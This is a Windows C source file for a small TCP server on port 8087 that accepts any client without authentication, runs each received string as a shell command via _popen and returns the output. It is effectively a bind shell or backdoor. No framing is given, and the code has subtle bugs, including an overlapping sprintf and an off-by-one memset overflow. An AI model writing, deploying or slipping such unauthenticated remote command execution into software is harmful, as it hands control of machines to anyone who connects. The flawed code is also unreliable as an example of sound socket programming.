#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <WinSock2.h>  

#define PORT 8087   
#define BUFFER_SIZE 4096  
#define CMD_MAX_SIZE 512  
#pragma comment(lib, "WS2_32")  

int txtcmd(TCHAR* cmd, TCHAR* result) {
	TCHAR cmdbuf[4096];
	sprintf(cmd, "%s 2>&1", cmd);
	FILE* pipe = _popen(cmd, "r");  //open the pipe and run command
	if (!pipe)
		return -1;

	while (!feof(pipe)) {
		if (fgets(cmdbuf, 4096, pipe))
		{
			strcat_s(result, 4096, cmdbuf);
		}

	}
	_pclose(pipe);
	return 0;
}


int main()
{
	TCHAR    CmdStr[CMD_MAX_SIZE];
	TCHAR    buffer[BUFFER_SIZE];

	WSADATA wsaData;
	WORD socketVersion = MAKEWORD(2, 0);
	if (WSAStartup(socketVersion, &wsaData) != 0)
	{
		printf("Init socket dll error!");
		exit(1);
	}

	sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.S_un.S_addr = htons(INADDR_ANY);
	server_addr.sin_port = htons(PORT);

	SOCKET m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if (SOCKET_ERROR == m_Socket)
	{
		printf("Create Socket Error!");
		exit(1);
	}

	if (SOCKET_ERROR == bind(m_Socket, (LPSOCKADDR)&server_addr, sizeof(server_addr)))
	{
		printf("Server Bind Failed: %d", WSAGetLastError());
		exit(1);
	}

	if (SOCKET_ERROR == listen(m_Socket, 10))
	{
		printf("Server Listen Failed: %d", WSAGetLastError());
		exit(1);
	}


	while (1)
	{
		printf("Listening To Client...\n");

		sockaddr_in client_addr;
		int client_addr_len = sizeof(client_addr);

		SOCKET m_New_Socket = accept(m_Socket, (sockaddr *)&client_addr, &client_addr_len);
		if (SOCKET_ERROR == m_New_Socket)
		{
			printf("Server Accept Failed: %d\n", WSAGetLastError());
			continue;
		}

		//recv the client's command
		memset(buffer, 0, BUFFER_SIZE);
		memset(CmdStr, 0, CMD_MAX_SIZE + 1);
		if (recv(m_New_Socket, buffer, BUFFER_SIZE, 0) < 0)
		{
			printf("Server Receive Data Failed!\n");
			continue;
		}
		
		memcpy(CmdStr, buffer, strlen(buffer) > CMD_MAX_SIZE ? CMD_MAX_SIZE : strlen(buffer));
		printf("CmdStr:%s\n", CmdStr);
		
		//execute the command and put the result into buffer
		memset(buffer, 0, BUFFER_SIZE);
		txtcmd(CmdStr, buffer);

		//send the result to client
		if (send(m_New_Socket,buffer,BUFFER_SIZE,0)<0)
		{
			printf("Server Send Data Failed!\n");
			continue;
		}
		
		closesocket(m_New_Socket);
	}

	closesocket(m_Socket);
 
	WSACleanup();
	return 0;
}
